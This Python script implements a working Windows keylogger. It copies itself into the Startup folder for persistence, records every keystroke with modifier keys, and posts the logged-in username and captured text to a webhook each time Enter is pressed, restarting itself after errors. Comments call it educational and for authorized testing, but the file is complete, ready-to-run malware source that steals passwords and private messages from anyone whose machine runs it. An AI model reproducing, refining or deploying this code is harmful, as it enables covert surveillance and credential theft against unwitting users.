# By sug023
# THIS SCRIPT HAS BEEN CREATED FOR INFORMATIONAL AND EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE FOR ANY CONSEQUENCES. USE IT AT YOUR OWN RISK.

import time
import threading
import requests
import keyboard
import os
import winshell
import sys
import shutil

# Webhook target (replace with your own endpoint for authorized testing)
WEBHOOK_URL = "Your webhook URL here"
DEBUG = False

class PersistentKeyLogger:
    """
    Ensures the script automatically starts with Windows by copying itself to the system startup folder.
    This persistence mechanism is for educational and authorized security testing only.
    """

    def __init__(self, debug: bool = True):
        self.debug = debug
        self.add_to_startup()

    def add_to_startup(self):
        """Copies the current executable/script to the Windows startup folder."""
        if winshell is None:
            if self.debug:
                print("[DEBUG] winshell not available; cannot add to startup.")
            return False

        current_file = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        try:
            startup_folder = winshell.startup()
            destination = os.path.join(startup_folder, os.path.basename(current_file))

            if os.path.exists(destination):
                if self.debug:
                    print(f"[DEBUG] Already exists in Startup: {destination}")
                return True

            shutil.copy(current_file, destination)
            if self.debug:
                print(f"[DEBUG] Copied to Startup: {destination}")
            return True

        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error copying to Startup: {e}")
            return False


class KeyLogger:
    """
    Captures and logs keyboard input for authorized testing purposes.
    Data is optionally sent to a webhook endpoint for monitoring.
    """

    def __init__(self, debug: bool = False, webhook: str = ''):
        self.debug = debug
        self.webhook = webhook
        self.lock = threading.Lock()
        self.keys_chain = []
        self.username = os.getlogin()

    def listen_keys(self):
        """Monitors keyboard activity and records pressed keys."""
        if self.debug:
            print('\n[ LISTENING FOR KEY INPUTS ]\n')

        def on_press(event):
            key = event.name
            mods = []

            if keyboard.is_pressed('ctrl'):
                mods.append(" [Ctrl")
            if keyboard.is_pressed('alt'):
                mods.append(" [Alt")
            if keyboard.is_pressed('shift'):
                mods.append(" [Shift")

            combo = ' + '.join(mods) + ' + ' + key + '] ' if mods else key
            self.keys_chain.append(combo)

            if self.debug:
                print(f'[DEBUG] Key pressed: {key}')

            if key == 'enter':
                self.send_data()

        keyboard.on_press(on_press)

        try:
            while True:
                time.sleep(1)
        except Exception as e:
            if self.debug:
                print(f'[!] Error in listen_keys: {e} [!]')

    def send_data(self):
        """Formats and sends captured keystrokes to the configured webhook."""
        if not self.keys_chain:
            return

        try:
            with self.lock:
                formatted_keys = []
                for key in self.keys_chain:
                    if key == 'space':
                        formatted_keys.append(' ')
                    elif key in ['tab', 'enter', 'backspace', 'esc', 'delete', 'insert', 'home', 'end', 'page up', 'page down', 'caps lock']:
                        formatted_keys.append(f' [{key.upper()}] ')
                    else:
                        formatted_keys.append(key)

                keys_string = ''.join(formatted_keys)
                data = {'content': f"\n{self.username} -> {keys_string}"}
                response = requests.post(self.webhook, data=data, timeout=20)

                if self.debug:
                    if response.status_code in (200, 201, 204):
                        print(f'[+] Data sent successfully (HTTP {response.status_code}) [+]')
                    else:
                        print(f'[!] Failed to send data (HTTP {response.status_code}) [!]')

                self.keys_chain.clear()

        except requests.RequestException as response:
            if self.debug:
                print(f'[!] Network error while sending: {response} [!]')

        except Exception as error:
            if self.debug:
                print(f'[!] Error sending data: {error} [!]')

    def run(self):
        """Starts the key listening thread and keeps the logger active."""
        listen_keys_thread = threading.Thread(target=self.listen_keys, daemon=True)
        listen_keys_thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("[+] Exiting gracefully [+]")
            listen_keys_thread.join()


def main():
    """
    Main execution loop for persistence and logging.
    Retries automatically if an exception occurs.
    """
    while True:
        try:
            PersistentKeyLogger()
            KeyLogger(webhook=WEBHOOK_URL, debug=DEBUG).run()
        except Exception as e:
            if DEBUG:
                print(f'[!] Error in main loop: {e} [!]')
            time.sleep(5)


if __name__ == "__main__":
    main()
